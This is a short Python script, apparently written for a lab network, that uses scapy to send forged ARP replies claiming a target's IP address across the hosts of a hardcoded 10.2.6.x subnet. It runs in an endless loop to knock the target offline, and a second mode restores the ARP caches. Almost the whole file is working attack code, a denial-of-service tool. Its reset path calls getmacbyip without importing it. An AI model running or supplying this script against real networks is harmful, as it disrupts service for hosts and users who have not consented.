from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import signal

def interruptHandler(signum, frame):
    res = input("Ctrl-c was pressed. Would you like to exit? y/n ")
    if res == 'y':
        exit(1)

def dos(target_ip):
    while True:
        for i in range(2, 10):
            if i != 3:
                dst_ip = '10.2.6.' + str(i)
                arp_response = ARP(pdst = dst_ip, psrc = target_ip, op = 2)
                send(arp_response, verbose = 0, count = 3)

def reset(target_ip, target_mac):
    for i in range(2, 10):
        if i != 3:
            dst_ip = '10.2.6.' + str(i)
            arp_response = ARP(pdst = dst_ip, psrc = target_ip, hwsrc = target_mac, op = 2)
            send(arp_response, verbose = 0, count = 7)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, interruptHandler)
    target_ip = input("Enter your target IP address: ")

    choice = input("Would you like to DoS or reset? dos/rst ")

    if choice == 'dos':
        print("Beginning DoS attack on IP: " + target_ip)
        dos(target_ip)
    elif choice == 'rst':
        target_mac = getmacbyip(target_ip)
        reset(target_ip, target_mac)
        print ("Reset the ARP caches to their original values!")